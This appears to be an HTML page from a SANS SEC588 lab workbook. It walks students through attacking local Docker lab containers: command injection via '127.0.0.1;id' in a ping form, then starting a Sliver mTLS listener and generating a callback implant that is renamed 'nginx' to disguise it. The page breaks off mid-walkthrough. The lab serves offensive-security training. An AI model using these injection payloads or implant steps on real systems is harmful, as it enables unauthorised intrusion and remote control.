
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="SANS SEC588 Workshops Workbook">
      
      
        <meta name="author" content="Moses Frost and Aaron Cure">
      
      
      <link rel="icon" href="../../../img/favicon.ico">
      <meta name="generator" content="mkdocs-1.3.0, mkdocs-material-8.2.11">
    
    
      
        <title>Container Lab - SANS SEC588 Workshops</title>
      
    
    
      <link rel="stylesheet" href="../../../assets/stylesheets/main.8c5ef100.min.css">
      
        
        <link rel="stylesheet" href="../../../assets/stylesheets/palette.9647289d.min.css">
        
          
          
          <meta name="theme-color" content="#ffffff">
        
      
    
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CSource+Code+Pro:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Source Code Pro"}</style>
      
    
    
      <link rel="stylesheet" href="../../../css/jquery.fancybox.min.css">
    
      <link rel="stylesheet" href="../../../css/pdf.css">
    
      <link rel="stylesheet" href="../../../css/html.css">
    
      <link rel="stylesheet" href="../../../css/custom.css">
    
    <script>__md_scope=new URL("../../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
  </head>
  
  
    
    
    
    
    
    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="white" data-md-color-accent="indigo">
  
    
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#containers-lab" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
      <div data-md-component="outdated" hidden>
        <aside class="md-banner md-banner--warning">
          
        </aside>
      </div>
    
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../../.." title="SANS SEC588 Workshops" class="md-header__button md-logo" aria-label="SANS SEC588 Workshops" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m12 3 8 6v12h-5v-7H9v7H4V9l8-6Z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            SANS SEC588 Workshops
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Container Lab
            
          </span>
        </div>
      </div>
    </div>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" aria-label="Clear" tabindex="-1">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
            
<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
  <div class="md-tabs__inner md-grid">
    <ul class="md-tabs__list">
      
        
  
  


  <li class="md-tabs__item">
    <a href="../../.." class="md-tabs__link">
      Home
    </a>
  </li>

      
        
  
  
    
  


  
  
  
    <li class="md-tabs__item">
      <a href="./" class="md-tabs__link md-tabs__link--active">
        Labs
      </a>
    </li>
  

      
        
  
  


  
  
  
    <li class="md-tabs__item">
      <a href="../../../resources/virtual-machine-credentials/" class="md-tabs__link">
        Resources
      </a>
    </li>
  

      
    </ul>
  </div>
</nav>
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

  


<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../../.." title="SANS SEC588 Workshops" class="md-nav__button md-logo" aria-label="SANS SEC588 Workshops" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m12 3 8 6v12h-5v-7H9v7H4V9l8-6Z"/></svg>

    </a>
    SANS SEC588 Workshops
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../../.." class="md-nav__link">
        Home
      </a>
    </li>
  

    
      
      
      

  
  
    
  
  
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" type="checkbox" id="__nav_2" checked>
      
      
      
        
          
        
          
        
          
        
          
        
      
      
        <label class="md-nav__link" for="__nav_2">
          Labs
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Labs" data-md-level="1">
        <label class="md-nav__title" for="__nav_2">
          <span class="md-nav__icon md-icon"></span>
          Labs
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
    
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          Container Lab
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        Container Lab
      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#current-status" class="md-nav__link">
    Current Status
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#brief-intro" class="md-nav__link">
    Brief Intro
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#requirements-for-this-lab" class="md-nav__link">
    Requirements for This Lab
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#try-it-yourself" class="md-nav__link">
    Try It Yourself
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#walkthrough" class="md-nav__link">
    Walkthrough
  </a>
  
    <nav class="md-nav" aria-label="Walkthrough">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#docker-assessing-newer-technologies" class="md-nav__link">
    Docker: Assessing newer technologies
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#conclusion" class="md-nav__link">
    Conclusion
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../identities/01-identities/" class="md-nav__link">
        Identities Lab 1
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../identities/02-identities/" class="md-nav__link">
        Identities Lab 2
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../identities/03-identities/" class="md-nav__link">
        Identities Lab 3
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" type="checkbox" id="__nav_3" >
      
      
      
        
          
        
      
      
        <label class="md-nav__link" for="__nav_3">
          Resources
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Resources" data-md-level="1">
        <label class="md-nav__title" for="__nav_3">
          <span class="md-nav__icon md-icon"></span>
          Resources
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../resources/virtual-machine-credentials/" class="md-nav__link">
        Virtual Machine Credentials
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#current-status" class="md-nav__link">
    Current Status
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#brief-intro" class="md-nav__link">
    Brief Intro
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#requirements-for-this-lab" class="md-nav__link">
    Requirements for This Lab
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#try-it-yourself" class="md-nav__link">
    Try It Yourself
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#walkthrough" class="md-nav__link">
    Walkthrough
  </a>
  
    <nav class="md-nav" aria-label="Walkthrough">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#docker-assessing-newer-technologies" class="md-nav__link">
    Docker: Assessing newer technologies
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#conclusion" class="md-nav__link">
    Conclusion
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content" data-md-component="content">
            <article class="md-content__inner md-typeset">
              
                


<h1 id="containers-lab">Containers Lab</h1>
<h3 id="current-status">Current Status</h3>
<h2 id="brief-intro">Brief Intro</h2>
<p>This is a very lengthy lab, but this lab will be critical as we talk about orchestrating containers. It is all done locally but these tactics can be used in any manner. This lab will have you perform the following attacks.</p>
<ol>
<li>Leverage <strong>sliver</strong> to gain access to internal system shells.</li>
<li>Use the shell to proxy through different internal containers using ProxyChains and Socks5 proxies.</li>
<li>Leverage docker.sock to start a privileged container on the system itself.</li>
</ol>
<p>This lab is self contained and shows you how to walk through not all of the potential <strong>docker</strong> attacks but many of them.</p>
<div class="admonition danger">
<p class="admonition-title">Danger</p>
<p>This lab has you running <strong>several</strong> docker containers of which memory <strong>will</strong> be an issue. You may wish at this point to shut down your machine and boost the memory of the Virtual Machine from 2GB or <mark class="critic">4GB</mark> of RAM.</p>
</div>
<h2 id="requirements-for-this-lab">Requirements for This Lab</h2>
<p>There are not special requirements for this lab. This lab can be done completely offline.</p>
<h2 id="try-it-yourself">Try It Yourself</h2>
<p>The following are step-by-step instructions to extract the virtual machine and gain familiarity with the tools used in the class.</p>
<ol>
<li>Open up several terminals (you will need 4 with the VPN)</li>
<li>Use the <strong>vulnapp</strong> to get a sliver shell</li>
<li>Portscan through the sliver shell using <strong>nabuu</strong> and <strong>proxychains</strong></li>
<li>Get onto the Jenkins Server</li>
<li>Once you are in the Jenkins Server get onto that container through the <strong>groovy</strong> shell functions</li>
<li>Execute a new container through the <strong>docker.sock</strong></li>
</ol>
<h2 id="walkthrough">Walkthrough</h2>
<h3 id="docker-assessing-newer-technologies">Docker: Assessing newer technologies</h3>
<ol>
<li>
<p>To get started, you must have a minimum of three (3) terminals for this lab. The exercises in this lab will use new terminal windows. You can either use tabs or new terminal windows.</p>
<p>Open a MATE Terminal Window by double-clicking on the <strong>MATE</strong> icon.</p>
<ul>
<li>
<p>You should have three additional terminals that we will now set the name for below</p>
</li>
<li>
<p>Terminal 2 | Set Title</p>
<p>Set the title to <mark class="critic">python</mark></p>
</li>
<li>
<p>Terminal 3 | Set Title</p>
<p>Set the title to <mark class="critic">working</mark></p>
</li>
<li>
<p>Terminal | Set Title</p>
<p>Set the title to <mark class="critic">sliver</mark></p>
</li>
</ul>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>You can also open a terminal by pressing <span class="keys"><kbd class="key-control">Ctrl</kbd><span>+</span><kbd class="key-alt">Alt</kbd><span>+</span><kbd class="key-t">T</kbd></span></p>
</div>
</li>
<li>
<p>Now let's bring up all our docker containers. From the <mark class="critic">working</mark> container.</p>
<div class="admonition danger">
<p class="admonition-title">Danger</p>
<p>Please note that this step takes up to 5 minutes to fully load the containers. The more resources you give you system the faster it will run.</p>
</div>
<div class="admonition cmd">
<p class="admonition-title">Command lines</p>
<div class="highlight"><pre><span></span><code><span class="nb">cd</span> /opt/dockerlabs/lab6
</code></pre></div>
</div>
<div class="admonition cmd">
<p class="admonition-title">Command lines</p>
<div class="highlight"><pre><span></span><code>docker compose up -d
</code></pre></div>
<details class="abstract">
<summary>Expected Results</summary>
<div class="highlight"><pre><span></span><code><span class="gp">sec588@slingshot ~ $ </span><span class="nb">cd</span> /opt/dockerlabs/lab6
<span class="gp">sec588@slingshot /opt/dockerlabs/lab6 $ </span>docker compose up -d
<span class="go">[+] Building 0.0s (0/0)</span>
<span class="go">[+] Running 11/11</span>
<span class="go"> ✔ Network npm-networking  Created                                         0.2s</span>
<span class="go"> ✔ Container vulnapp       Started                                         4.4s</span>
<span class="go"> ✔ Container dozzle        Started                                         3.6s</span>
<span class="go"> ✔ Container jenkins       Started                                         4.3s</span>
<span class="go"> ✔ Container bukuserver    Started                                         3.9s</span>
<span class="go"> ✔ Container redis         Started                                         3.8s</span>
<span class="go"> ✔ Container uptime-kuma   Started                                         4.3s</span>
<span class="go"> ✔ Container portainer     Started                                         3.8s</span>
<span class="go"> ✔ Container heimdall      Started                                         4.3s</span>
<span class="go"> ✔ Container db            Started                                         4.1s</span>
<span class="go"> ✔ Container npm           Started                                         6.1s</span>
<span class="gp">sec588@slingshot /opt/dockerlabs/lab6 $</span>
</code></pre></div>
</details>
</div>
</li>
<li>
<p>To look at our localized containers, let's start with one called "Heimdall".</p>
<div class="admonition cmd">
<p class="admonition-title">Command lines</p>
<div class="highlight"><pre><span></span><code>firefox http://heimdall.local:8888 <span class="p">&amp;</span>
</code></pre></div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>The process id below of <mark class="critic">12345</mark> will be different for each student</p>
</div>
<details class="abstract">
<summary>Expected Results</summary>
<div class="highlight"><pre><span></span><code>sec588:slingshot:workdir$ firefox http://heimdall.local:8888 <span class="p">&amp;</span>
<span class="o">[</span><span class="m">1</span><span class="o">]</span> <span class="m">12345</span>
</code></pre></div>
</details>
</div>
</li>
<li>
<p>Heimdall is a dashboard where the administrators can hold several links. Think of it as a lovely home dashboard with additional integrations. Providing Heimdall with logins will populate the data in the dashboard for you in a preview window. For example, Jenkins runs jobs or containers that Portainer is managing.</p>
<p>We are going to click on the vulnlab button.</p>
<p><img alt="Heimdall Dashboard" class="noborder" src="../img/heimdall.png" /></p>
<p>Once you have clicked on this Vulnapp Dashboard Widget, you will be taken to the "Vulnerable Application Server".</p>
</li>
<li>
<p>Once you are in the Vulnerable Application, you can see a simple "ping application" with a form. Let's validate that this application is "vulnerable."</p>
<p>Notice that in the web application form, we will type the following value and hit enter:</p>
<div class="admonition cmd">
<p class="admonition-title">Form Input</p>
<div class="highlight"><pre><span></span><code>127.0.0.1
</code></pre></div>
<div class="admonition abstract">
<p class="admonition-title">Expected Results</p>
<p><img alt="VulnApp Test1" class="noborder" src="../img/vulnapp_test1.png" /></p>
</div>
</div>
<p>Now let's add additional Linux commands to validate the actual bug. The <code>id</code> command would be a command that we could run.</p>
<div class="admonition cmd">
<p class="admonition-title">Form Input</p>
<div class="highlight"><pre><span></span><code>127.0.0.1;id
</code></pre></div>
<div class="admonition abstract">
<p class="admonition-title">Expected Results</p>
<p><img alt="VulnApp Test1" class="noborder" src="../img/vulnapp_test2.png" /></p>
</div>
</div>
<p>Did you notice the output? Let's try it from the command line to analyze better what is occurring. Switch back to the MATE Terminal.</p>
</li>
<li>
<p>Run the following <strong>curl</strong> command within the MATE Terminal.</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>Do this from the <mark class="critic">working</mark> Terminal Window</p>
</div>
<div class="admonition cmd">
<p class="admonition-title">Command Lines</p>
<div class="highlight"><pre><span></span><code>curl <span class="s2">&quot;http://vulnapp.local:8000/ping.php?form_submitted=1&amp;ping=127.0.0.1%3Bid&quot;</span>
</code></pre></div>
<details class="abstract">
<summary>Expected Results</summary>
<div class="highlight"><pre><span></span><code>sec588:slingshot:~$ curl <span class="s2">&quot;http://vulnapp.local:8000/ping.php?form_submitted=1&amp;ping=127.0.0.1%3Bid&quot;</span>
&lt;html&gt;
  &lt;head&gt;

  &lt;/head&gt;
  &lt;script&gt;
    <span class="k">function</span> encode<span class="o">()</span> <span class="o">{</span>
      const <span class="nv">str</span> <span class="o">=</span> document.getElemntById<span class="o">(</span><span class="s2">&quot;ping&quot;</span><span class="o">)</span>.value<span class="p">;</span>
      console.log<span class="o">(</span>str<span class="o">)</span>
      <span class="k">return</span> str<span class="p">;</span>
    <span class="o">}</span>
&lt;/script&gt;

  &lt;form <span class="nv">class</span><span class="o">=</span><span class="s2">&quot;form-inline&quot;</span> <span class="nv">action</span><span class="o">=</span><span class="s2">&quot;&quot;</span> <span class="nv">method</span><span class="o">=</span><span class="s2">&quot;GET&quot;</span>&gt;
    &lt;label <span class="k">for</span><span class="o">=</span><span class="s2">&quot;ping&quot;</span>&gt;What <span class="k">do</span> you want to ping?&lt;/label&gt;
    &lt;input <span class="nv">type</span><span class="o">=</span><span class="s2">&quot;ping&quot;</span> <span class="nv">id</span><span class="o">=</span><span class="s2">&quot;ping&quot;</span> <span class="nv">placeholder</span><span class="o">=</span><span class="s2">&quot;127.0.0.1&quot;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;ping&quot;</span>&gt;
    &lt;input <span class="nv">type</span><span class="o">=</span><span class="s2">&quot;hidden&quot;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;form_submitted&quot;</span> <span class="nv">value</span><span class="o">=</span><span class="s2">&quot;1&quot;</span> /&gt;
    &lt;button <span class="nv">type</span><span class="o">=</span><span class="s2">&quot;submit&quot;</span>&gt;Submit&lt;/button&gt;
  &lt;/form&gt;
&lt;pre&gt;
        Running ping -c <span class="m">2</span> <span class="m">127</span>.0.0.1<span class="p">;</span>id: 
PING <span class="m">127</span>.0.0.1 <span class="o">(</span><span class="m">127</span>.0.0.1<span class="o">)</span> <span class="m">56</span><span class="o">(</span><span class="m">84</span><span class="o">)</span> bytes of data.
<span class="m">64</span> bytes from <span class="m">127</span>.0.0.1: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">1</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">64</span> <span class="nv">time</span><span class="o">=</span><span class="m">0</span>.027 ms
<span class="m">64</span> bytes from <span class="m">127</span>.0.0.1: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">2</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">64</span> <span class="nv">time</span><span class="o">=</span><span class="m">0</span>.036 ms

--- <span class="m">127</span>.0.0.1 ping statistics ---
<span class="m">2</span> packets transmitted, <span class="m">2</span> received, <span class="m">0</span>% packet loss, <span class="nb">time</span> 1031ms
rtt min/avg/max/mdev <span class="o">=</span> <span class="m">0</span>.027/0.031/0.036/0.004 ms
<span class="nv">uid</span><span class="o">=</span><span class="m">33</span><span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span><span class="m">33</span><span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span><span class="m">33</span><span class="o">(</span>www-data<span class="o">)</span>
Done Running    &lt;/pre&gt;
&lt;/html&gt;
</code></pre></div>
</details>
</div>
<p>Look at what is occurring here:</p>
<ul>
<li>The command that is run is going to be reflected as: <code>ping -c 2 127.0.0.1;id</code></li>
<li>The command output is reflected below starting with: <code>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.</code></li>
<li>After the ping command, we see the output of: <code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code> denoting command injection</li>
</ul>
<p><strong>Bonus</strong>: There is also XSS on this page as the command is being reflected on the page without sanitization, and you are in control of the command. </p>
</li>
<li>
<p>You may have noticed that this container runs the Apache process as www-data, typically uid/gid 33 on Debian. Given that we are not root, we may be limited in what we can do on this device. We can, however, execute commands; let us see how we can get access to the container without using docker commands. The first thing we will want to do is start a "sliver" server instance.</p>
<p>First, we must extract the IP Address from the machine to run this attack.</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>Do this from the <mark class="critic">working</mark> Terminal Window </p>
</div>
<div class="admonition cmd">
<p class="admonition-title">Command Lines</p>
<div class="highlight"><pre><span></span><code>ip addr show eth0
</code></pre></div>
<div class="admonition danger">
<p class="admonition-title">Danger</p>
<p>The IP address for this VM at the time of <strong>this</strong> writing is <mark class="critic">192.168.4.9</mark>. <mark class="critic"><strong>Yours will be different</strong></mark>. Please note this address as you will need it several times.</p>
</div>
<details class="abstract">
<summary>Expected Results</summary>
<div class="highlight"><pre><span></span><code><span class="gp">sec588:slingshot:workdir$ </span>ip addr show eth0
<span class="go">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000</span>
<span class="go">    link/ether 00:0c:29:b8:1a:a7 brd ff:ff:ff:ff:ff:ff</span>
<span class="go">    altname enp2s1</span>
<span class="go">    altname ens33</span>
<span class="go">    inet <mark class="critic">192.168.4.9</mark>/24 metric 100 brd 192.168.4.255 scope global dynamic eth0</span>
<span class="go">       valid_lft 3587sec preferred_lft 3587sec</span>
</code></pre></div>
</details>
</div>
<p>We can store this value in a variable for use later.</p>
<div class="admonition cmd">
<p class="admonition-title">Command lines</p>
<div class="highlight"><pre><span></span><code><span class="nv">IP</span><span class="o">=</span><span class="k">$(</span>ip addr show eth0 <span class="p">|</span> grep inet <span class="p">|</span> awk <span class="s1">&#39;{ print $2 }&#39;</span> <span class="p">|</span> awk -F/ <span class="s1">&#39;{ print $1 }&#39;</span><span class="k">)</span>
</code></pre></div>
</div>
<div class="admonition cmd">
<p class="admonition-title">Command lines</p>
<div class="highlight"><pre><span></span><code><span class="nb">echo</span> <span class="nv">$IP</span>
</code></pre></div>
<details class="abstract">
<summary>Expected Results</summary>
<div class="highlight"><pre><span></span><code><span class="gp">sec588:slingshot:workdir$ $ </span><span class="nv">IP</span><span class="o">=</span><span class="k">$(</span>ip addr show eth0 <span class="p">|</span> grep inet <span class="p">|</span> awk <span class="s1">&#39;{ print $2 }&#39;</span> <span class="p">|</span> awk -F/ <span class="s1">&#39;{ print $1 }&#39;</span><span class="k">)</span>
<span class="gp">sec588:slingshot:workdir$ $ </span><span class="nb">echo</span> <span class="nv">$IP</span>
<span class="go">192.168.4.9</span>
</code></pre></div>
</details>
</div>
<p>Next, we will run a <mark class="critic">Sliver</mark> and generate our implant.  Please open a <em>New</em> MATE Terminal Window. We will call this window <mark class="critic">Sliver</mark> and this will be the Window name we refer to.</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>You can also open a terminal by pressing <span class="keys"><kbd class="key-control">Ctrl</kbd><span>+</span><kbd class="key-alt">Alt</kbd><span>+</span><kbd class="key-t">T</kbd></span>. Using the <code>Terminal | Set Title ...</code> of the menu call this window <mark class="critic">Sliver</mark>.</p>
</div>
<div class="admonition danger">
<p class="admonition-title">Danger</p>
<p>Please note that generating a sliver implant may take a long time and will also place the implant in the directory from which you ran <code>sliver</code>. For us, that directory will be <code>/home/sec588/Coursefiles/workdir</code></p>
</div>
<div class="admonition cmd">
<p class="admonition-title">Command Lines</p>
<div class="highlight"><pre><span></span><code><span class="nb">cd</span> /home/sec588/Coursefiles/workdir
</code></pre></div>
<div class="admonition cmd">
<p class="admonition-title">Command Lines</p>
<div class="highlight"><pre><span></span><code>sudo systemctl start sliver
</code></pre></div>
</div>
<div class="admonition cmd">
<p class="admonition-title">Command Lines</p>
<div class="highlight"><pre><span></span><code>sliver
</code></pre></div>
</div>
<div class="admonition cmd">
<p class="admonition-title">Command Lines</p>
<div class="highlight"><pre><span></span><code><span class="go">mtls -l 9999</span>
</code></pre></div>
</div>
<div class="admonition cmd">
<p class="admonition-title">Command Lines</p>
<div class="highlight"><pre><span></span><code>generate --os linux --mtls <mark class="critic">192.168.4.9</mark>:9999 --skip-symbols
</code></pre></div>
<details class="abstract">
<summary>Expected Results</summary>
<div class="highlight"><pre><span></span><code><span class="gp">sec588:slingshot:~$ </span><span class="nb">cd</span> /home/sec588/Coursefiles/workdir
<span class="gp">sec588:slingshot:workdir$ </span>sudo systemctl start sliver
<span class="gp">sec588:slingshot:workdir$ </span>sliver
<span class="go">Connecting to localhost:31337 ...</span>

<span class="go">    ███████╗██╗     ██╗██╗   ██╗███████╗██████╗</span>
<span class="go">    ██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗</span>
<span class="go">    ███████╗██║     ██║██║   ██║█████╗  ██████╔╝</span>
<span class="go">    ╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗</span>
<span class="go">    ███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║</span>
<span class="go">    ╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝</span>

<span class="go">All hackers gain skulk</span>
<span class="go">[*] Server v1.5.35 - 1756fdfb62eb21346a3149fa34af127e34d4b799</span>
<span class="go">[*] Welcome to the sliver shell, please type &#39;help&#39; for options</span>

<span class="go">[*] Check for updates with the &#39;update&#39; command</span>
<span class="go">sliver &gt; mtls -l 9999</span>

<span class="go">[*] Starting mTLS :9999 listener ...</span>
<span class="go">[*] Successfully started job #1</span>

<span class="go">sliver &gt; generate --os linux --mtls <mark class="critic">192.168.4.9</mark>:9999 --skip-symbols</span>

<span class="go">[*] Generating new linux/amd64 implant binary</span>
<span class="go">[*] Symbol obfuscation is disabled</span>
<span class="go">[*] Build completed in 1m5s</span>
<span class="hll"><span class="go">[*] Implant saved to /home/sec588/Coursefiles/workdir/PROPOSED_DECREASE</span>
</span>
<span class="go">sliver &gt; </span>
</code></pre></div>
</details>
</div>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>You may have realized that every <mark class="critic">Sliver</mark> implant, if not directed with a specific name, will have an upper cased implant name that will look oddly similar to specific threat actors.</p>
</div>
<p>This is a <code>go</code> based binary implant that does not require any dependencies; we can serve it up and upload it to the container if we want. Let's use <code>python</code> to do this. The name of the binary that we created is <strong>PROPOSED_DECREASE</strong> in the workbook. But on your system your binary will have a completely different name. Just be sure you are aware of this.</p>
<p>Let's rename the binary so that we can make all the lab steps a bit easier for us to provide.</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>In the value below replace the word <strong>PROPOSED_DECREASE</strong> with the name of you binary.</p>
</div>
<div class="admonition cmd">
<p class="admonition-title">Command Lines</p>
<div class="highlight"><pre><span></span><code><span class="nv">BIN</span><span class="o">=</span><mark class="critic"><span class="s2">&quot;PROPOSED_DECREASE&quot;</span></mark>
</code></pre></div>
<div class="admonition cmd">
<p class="admonition-title">Command Lines</p>
<div class="highlight"><pre><span></span><code>mv /home/sec588/Coursefiles/workdir/<span class="nv">$BIN</span> /home/sec588/Coursefiles/workdir/nginx
</code></pre></div>
<details class="abstract">
<summary>Expected Results</summary>
<div class="highlight"><pre><span></span><code><span class="go">BIN=&quot;PROPOSED_DECREASE&quot;</span>
</code></pre></div>
</details>
</div>
</div>
</li>
<li>
